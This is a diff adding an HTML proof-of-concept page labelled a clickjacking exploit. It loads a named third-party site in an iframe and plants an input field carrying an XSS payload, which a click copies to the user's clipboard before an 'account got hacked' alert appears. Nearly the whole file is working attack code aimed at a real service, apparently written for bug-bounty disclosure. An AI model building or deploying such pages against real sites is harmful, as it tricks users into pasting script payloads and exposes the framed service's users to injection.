@@ -1,0 +1,28 @@
+<html>
+<head><title>Poc</title></head>
+<body>
+<h1>Clickjacking Expolit by susant (sniffboy)</h1>
+Message :<input id="copy-text" type="text" value='"><img src=x onerror=prompt(document.domain)>"'>
+<br><br><br>
+<script>
+document.getElementById("copy-text").onclick = function(){
+this.select();
+document.execCommand('copy');
+alert("You'r account got hacked by susant !")
+}
+</script>
+<style>
+iframe {
+width: 600px;
+height: 450px;
+position: absolute;
+top: 0; right: 10;
+filter: alpha(opacity=50);
+opacity: 1.0;
+}
+</style>
+<iframe src="http://webjob-gameplay.refereum.com"></iframe>
+</body>
+</html>
+
+
